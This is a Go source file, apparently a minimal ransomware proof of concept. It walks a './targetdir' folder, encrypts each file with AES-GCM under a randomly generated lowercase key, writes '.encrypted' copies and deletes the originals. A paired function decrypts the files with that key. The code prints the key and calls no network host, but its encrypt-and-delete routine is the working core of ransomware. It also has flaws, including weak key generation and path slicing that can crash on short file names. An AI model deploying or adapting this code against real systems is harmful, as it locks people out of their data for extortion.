package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"math/big"
	"os"
	"path/filepath"
)

func keygen(maxLength int) ([]byte, error) {
	possibleCharacters := "abcdefghijklmnopqrstuvwxyz"
	result := make([]byte, maxLength)

	for i := 0; i < maxLength; i++ {
		indexBig, err := rand.Int(rand.Reader, big.NewInt(int64(len(possibleCharacters))))
		if err != nil {
			return nil, err
		}
		index := indexBig.Int64()
		result[i] = possibleCharacters[index]
	}

	return result, nil
}

func encrypt() ([]byte, error) {
	fmt.Println("starting encrpytion")
	key, err := keygen(16)
	if err != nil {
		return nil, fmt.Errorf("error generating the key: %s", err.Error())
	}
	fmt.Println("aes key:", string(key))

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("failed to create AES cipher block: %w", err)
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("failed to create GCM cipher: %w", err)
	}

	err = filepath.Walk("./targetdir", func(path string, info os.FileInfo, err error) error {
		if !info.IsDir() && !(path[len(path)-10:] == ".encrypted") {
			fmt.Println("encrypting", path)
			plaintext, err := os.ReadFile(path)
			if err != nil {
				return fmt.Errorf("failed to read input file: %w", err)
			}

			nonce := make([]byte, gcm.NonceSize())
			if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
				return fmt.Errorf("failed to generate nonce: %w", err)
			}

			ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)

			err = os.WriteFile(path+".encrypted", ciphertext, 0644)
			if err != nil {
				return fmt.Errorf("failed to write output file: %w", err)
			}
			os.Remove(path)

		}
		return nil
	})

	if err != nil {
		return nil, err
	}

	fmt.Println("encryption successful")
	return key, nil
}

func decrypt(key string) error {
	fmt.Println("startring decryption")

	block, err := aes.NewCipher([]byte(key))
	if err != nil {
		return fmt.Errorf("failed to create AES cipher block: %w", err)
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return fmt.Errorf("failed to create GCM cipher: %w", err)
	}

	err = filepath.Walk("./targetdir", func(path string, info os.FileInfo, err error) error {
		if !info.IsDir() && path[len(path)-10:] == ".encrypted" {
			ciphertext, err := os.ReadFile(path)
			if err != nil {
				return fmt.Errorf("failed to read input file: %w", err)
			}

			nonceSize := gcm.NonceSize()
			if len(ciphertext) < nonceSize {
				return fmt.Errorf("invalid ciphertext: too short to contain nonce")
			}

			nonce, actualCiphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]

			plaintext, err := gcm.Open(nil, nonce, actualCiphertext, nil)
			if err != nil {
				return fmt.Errorf("failed to decrypt/authenticate ciphertext: %w", err)
			}
			fmt.Println("decrypting", path)

			err = os.WriteFile(path[:len(path)-10], plaintext, 0644)
			if err != nil {
				return fmt.Errorf("failed to write output file: %w", err)
			}

			os.Remove(path)
		}
		return nil
	})

	if err != nil {
		return err
	}

	fmt.Println("decryption successful")
	return nil
}
